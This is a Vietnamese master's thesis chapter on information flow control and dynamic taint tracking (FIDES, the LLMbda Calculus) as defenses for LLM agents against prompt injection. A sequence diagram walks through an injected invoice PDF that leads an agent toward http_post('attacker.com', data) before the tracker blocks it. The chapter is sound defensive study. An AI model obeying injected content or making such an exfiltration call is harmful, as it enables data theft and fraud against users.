# Chương 3: Kiểm Soát Luồng Thông Tin (Information Flow Control) — FIDES & The LLMbda Calculus

> **Thông Tin Tài Liệu / Document Metadata:**
> - **Tác giả / Học viên:** Võ Phạm Tuấn Dũng (MSHV: 2570015) — `@tuandung222`
> - **Cán bộ Hướng dẫn:** TS. Lê Xuân Bách
> - **Chuyên ngành:** Thạc sĩ Khoa học Dữ liệu & Trí tuệ Nhân tạo Ứng dụng (CDNC AI - Khóa 261)
> - **Đơn vị:** Khoa Khoa học & Kỹ thuật Máy tính, Trường ĐH Bách Khoa, ĐHQG-HCM (HCMUT)
> - **Đề tài:** TrustSight (*An Empirical Study of Anchored Visual Perception for Prompt-Injection-Resistant Multimodal Agents*)
> - **Kho Lưu Trữ:** `tuandung222/software-security-agent-defenses`
> - **Ngày giờ biên soạn / Cập nhật (Timestamp):** 2026-10-06 01:45:00 (GMT+7)

---

## 1. Đặt Vấn Đề: Tại Sao Cần Kiểm Soát Luồng Thông Tin (IFC)?

Trong các hệ thống phần mềm truyền thống, kiểm soát truy cập (Access Control) chỉ quyết định xem một tiến trình có quyền đọc hoặc ghi vào một tài nguyên tại một thời điểm nhất định hay không. Tuy nhiên, nó không thể trả lời câu hỏi:  
*Sau khi tiến trình đọc một dữ liệu nhạy cảm hoặc không tin cậy, dữ liệu đó sẽ chảy đi đâu trong hệ thống?*

Đối với các Tác tử LLM/VLM, điểm mù này trở nên đặc biệt nguy hiểm:
- Tác tử đọc một email chứa mã độc tiêm nhiễm (Untrusted Input).
- Tác tử tóm tắt nội dung email đó và lưu vào bộ nhớ ngữ cảnh (Context Memory).
- Vài bước sau, tác tử dùng thông tin đó để soạn một truy vấn cơ sở dữ liệu hoặc gửi một gói tin HTTP ra ngoài Internet (Data Exfiltration Sink).

Để bịt lỗ hổng này, các nhà nghiên cứu an ninh hệ thống đã mang một trong những lý thuyết an ninh máy tính chặt chẽ nhất trở lại: **Kiểm Soát Luồng Thông Tin (Information Flow Control - IFC)** và **Theo Dõi Vết Dữ Liệu Động (Dynamic Taint Tracking)**, tiêu biểu là hai công trình:
1. **FIDES: Securing AI Agents with Information-Flow Control** (IEEE Symposium on Security and Privacy - S&P / Oakland 2025).
2. **The LLMbda Calculus: AI Agents, Conversations, and Information Flow** (arXiv:2506).

```mermaid
flowchart TD
    subgraph SOURCES["NGUỒN DỮ LIỆU (SOURCES)"]
        UserTrusted["Chỉ thị Người Dùng (Trusted High)"]
        ExternalData["Trang Web / Ảnh / PDF (Untrusted Low / Tainted)"]
    end

    subgraph AGENT_RUNTIME["TRÌNH THỰC THI TÁC TỬ (AGENT RUNTIME)"]
        VLM_Reasoning["Mô hình Suy luận LLM / VLM"]
        TaintEngine["Bộ Theo Dõi Taint Động (Taint Engine)"]
        ContextVars["Biến Bộ Nhớ & Token Trạng Thái"]
        
        VLM_Reasoning <--> ContextVars
        TaintEngine -. "Theo dõi nhãn lan truyền" .-> ContextVars
    end

    subgraph SINKS["ĐIỂM ĐẾN THỰC THI (SINKS)"]
        SafeSink["Hiển thị màn hình cho Người dùng (Declassified Sink)"]
        DangerousSink["Mạng Egress / Xóa Tệp / Chuyển Tiền (Privileged Sinks)"]
    end

    UserTrusted -- "Nhãn: Clean" --> VLM_Reasoning
    ExternalData -- "Nhãn: Tainted (Bẩn)" --> VLM_Reasoning
    
    ContextVars --> SafeSink
    ContextVars -- "Chứa Tainted Data" --> TaintFilter{"Kiểm tra Luật Lattice IFC"}
    TaintFilter -- "Cho phép nếu đã khử nhiễm" --> DangerousSink
    TaintFilter -- "VI PHẠM: Dữ liệu bẩn chảy vào Sink nhạy cảm" --> BlockAction["CHẶN ĐỨNG HÀNH ĐỘNG"]

    style SOURCES fill:#f8fafc,stroke:#475569,stroke-width:1.5px
    style AGENT_RUNTIME fill:#fefce8,stroke:#ca8a04,stroke-width:2px
    style SINKS fill:#eff6ff,stroke:#2563eb,stroke-width:1.5px
    style BlockAction fill:#fee2e2,stroke:#dc2626,stroke-width:2px
```

---

## 2. Mô Hình Bảo Mật Lattice & Các Nhãn An Ninh

Lý thuyết IFC chuẩn tắc xây dựng trên cấu trúc **Dàn An Ninh (Security Lattice)** $(\mathcal{L}, \sqsubseteq)$, trong đó $\sqsubseteq$ là quan hệ thứ tự riêng phần định nghĩa luồng thông tin hợp lệ:

$$
A \sqsubseteq B \iff \text{Thông tin có thể chảy hợp lệ từ nhãn } A \text{ sang nhãn } B \qquad (1)
$$

Trong hệ thống AI Agent, mỗi luồng dữ liệu được gắn một cặp nhãn:
- **Độ tin cậy toàn vẹn (Integrity Label - $I$):** $I \in \{\text{Untrusted}, \text{Trusted}\}$.
- **Độ bảo mật (Confidentiality Label - $C$):** $C \in \{\text{Public}, \text{Secret}\}$.

### 2.1. Hai Nguyên Lý Bất Di Bất Dịch

1. **Nguyên lý Toàn vẹn Biba (Biba Integrity Model):**
   *No Read Down, No Write Up*: Một tiến trình mức toàn vẹn cao không được đọc dữ liệu mức thấp mà không qua cơ chế khử nhiễm; dữ liệu mức toàn vẹn thấp không bao giờ được ghi đè vào trạng thái mức cao:

$$
I_{\text{source}} \sqsubseteq I_{\text{target}} \implies \text{Dữ liệu bẩn không thể tự nâng cấp thành tin cậy} \qquad (2)
$$

2. **Nguyên lý Bảo mật Bell-LaPadula:**
   *No Read Up, No Write Down*: Không đọc trộm dữ liệu mật; không chuyển dữ liệu mật vào các kênh công khai (Network Egress).

---

## 3. The LLMbda Calculus: Hình Thức Hóa Tác Tử Bằng Giải Tích Hàm

Công trình **The LLMbda Calculus** (arXiv:2506) cung cấp nền tảng toán học hình thức để mô hình hóa hành vi của các tác tử AI dưới dạng một biến thể của giải tích lambda có kiểu ($\lambda$-calculus) kết hợp hệ thống kiểu an ninh (Security Type System).

### 3.1. Tính Chất Bất Can Thiệp (Non-Interference)

Trong khoa học máy tính lý thuyết, tính chất an toàn tối cao của một hệ thống IFC được định nghĩa bằng **Bất Can Thiệp (Non-Interference)**:  
*Dữ liệu ở mức bảo mật cao (hoặc dữ liệu đối kháng ở mức toàn vẹn thấp) không được phép gây ra bất kỳ sự thay đổi có thể quan sát được nào trên các kênh đầu ra tin cậy.*

Về mặt hình thức, giả sử hệ thống có hai trạng thái bộ nhớ ban đầu $s_1$ và $s_2$ tương đương nhau ở góc nhìn của người quan sát mức thấp ($s_1 \approx_L s_2$). Sau khi thực thi biểu thức tác tử $e$:

$$
s_1 \approx_L s_2 \implies \mathcal{E}\llbracket e \rrbracket s_1 \approx_L \mathcal{E}\llbracket e \rrbracket s_2 \qquad (3)
$$

Nếu kẻ tấn công cài một đoạn prompt injection vào hình ảnh web, nhưng biểu thức thực thi trên các công cụ nhạy cảm (như gửi email ra ngoài) cho ra kết quả hoàn toàn giống nhau bất kể hình ảnh có bị chèn mã độc hay không, hệ thống thỏa mãn tính chất Non-Interference.

### 3.2. Nghịch Lý Của Mô Hình Ngôn Ngữ: Bộ Khử Nhiễm Xác Suất (Stochastic Declassifier)

Trong các hệ thống phần mềm thông thường, ranh giới giữa dữ liệu và mã là tuyệt đối. Tuy nhiên, LLM hoạt động như một **Bộ Khử Nhiễm Xác Suất (Stochastic Declassifier)**:  
- Khi LLM đọc một tài liệu chứa thông tin nhạy cảm và tóm tắt lại, bản tóm tắt đó là một hàm phi tuyến tính, xác suất của toàn bộ chuỗi token đầu vào.
- Làm thế nào để biết bản tóm tắt đó có vô tình để lộ bí mật hoặc bị thao túng bởi một chỉ thị độc hại hay không?
- **FIDES** giải quyết vấn đề này bằng cách: Mọi giá trị phát sinh từ một ngữ cảnh có chứa token bẩn đều bị dán nhãn **Tainted** vĩnh viễn, trừ khi đi qua một bộ giải mã có cấu trúc định kiểu tường minh do TCB phê duyệt.

---

## 4. Cơ Chế Dynamic Taint Tracking Tại Runtime Của FIDES

Hệ thống FIDES can thiệp trực tiếp vào môi trường thực thi (Runtime Interceptor) của Agent theo các bước:

```mermaid
sequenceDiagram
    autonumber
    actor Web as Máy Chủ Web Ngoại Vi
    participant Agent as Agent Execution Engine
    participant Tracker as FIDES Taint Tracker
    participant Sink as Network Egress Sink

    Web->>Agent: Trả về tài liệu PDF hóa đơn
    Agent->>Tracker: Đăng ký luồng dữ liệu mới
    Note over Tracker: Gán nhãn TAINTED (Độ toàn vẹn Thấp)
    Tracker-->>Agent: Trả về handle dữ liệu kèm cờ Tainted
    Agent->>Agent: LLM trích xuất: "Gửi 100 USD tới attacker.com"
    Note over Tracker: Thuộc tính Tainted tự động lan truyền sang biến recipient
    Agent->>Sink: Yêu cầu gọi API: http_post("attacker.com", data)
    Sink->>Tracker: Tra vấn nhãn an ninh của tham số
    Note over Tracker: PHÁT HIỆN: recipient mang nhãn TAINTED!<br/>Sink là kênh ngoại vi không tin cậy.
    Tracker-->>Sink: TỪ CHỐI THỰC THI (Policy Violation: Tainted Sink Access)
    Sink-->>Agent: Ném lỗi SecurityException
```

### 4.1. Quy Tắc Lan Truyền Nhãn (Taint Propagation Rules)

1. **Lan truyền trực tiếp (Direct Assignment):**  
   Nếu $y = f(x)$ và $x$ mang nhãn `Tainted`, thì $y$ tự động kế thừa nhãn `Tainted`.
2. **Lan truyền điều khiển (Implicit Flow / Control Dependency):**  
   Nếu một khối lệnh rẽ nhánh phụ thuộc vào một biến `Tainted`:
   ```python
   if is_tainted_flag:
       action = "delete_file"
   ```
   Thì biến `action` sinh ra trong khối rẽ nhánh đó cũng bị coi là `Tainted`.
3. **Chốt chặn tại Sink (Sink Enforcement):**  
   Các hàm hệ thống nguy hiểm (như `send_http_request`, `write_filesystem`, `execute_shell`) được gán nhãn yêu cầu `Trusted`. Bất kỳ tham số nào mang nhãn `Tainted` khi truyền vào các hàm này sẽ kích hoạt ngoại lệ an ninh ngay lập tức.

---

## 5. So Sánh Với Các Hệ Thống IFC Kinh Điển & Ứng Dụng Trong TrustSight

| Hệ Thống | Môi Trường | Cơ Chế Tracking | Xử Lý Rẽ Nhánh Ngữ Nghĩa |
|:---|:---|:---|:---|
| **Jif (Myers et al.)** | Ngôn ngữ Java tĩnh | Static Type System | Nghiêm ngặt qua kiểm tra kiểu compile-time |
| **HiStar / Flume** | Nhân Hệ Điều Hành (OS Kernel) | Kernel-level Taint Tracking | Dựa trên nhãn Process / Socket / File |
| **FIDES (IEEE S&P 2025)** | LLM Agent Framework | Dynamic Runtime Tracking | Gán nhãn trên token và biến môi trường |
| **TrustSight (Đề tài)** | VLM Multimodal Agent | Semantic Contract & Anchor Grounding | Chốt chặn TCB dựa trên HMAC Token |

Trong đề tài **TrustSight**:
- Mọi quan sát thị giác từ màn hình ($I_t$) đều được gán nhãn mặc định là **Dữ liệu Không Tin Cậy (Untrusted Perception)**.
- Dữ liệu này chỉ được phép chảy qua **Tầng Nhận Thức Định Kiểu (C2: Structured Perception Layer)** để chuyển đổi thành cấu trúc JSON, sau đó đối soát với Hợp đồng Ngữ nghĩa của người dùng ($C_t$) tại TCB.
- Dữ liệu thị giác thô tuyệt đối không bao giờ được phép chảy trực tiếp vào các Sink thực thi mà không có token ủy quyền HMAC do TCB cấp phát.

---

[⬅️ Quay lại Chương 2: Conseca & Progent](02_conseca_va_progent_policy_gating.md) | [Tiếp tục sang Chương 4: Task Shield & Design Patterns ➡️](04_task_shield_va_design_patterns.md)
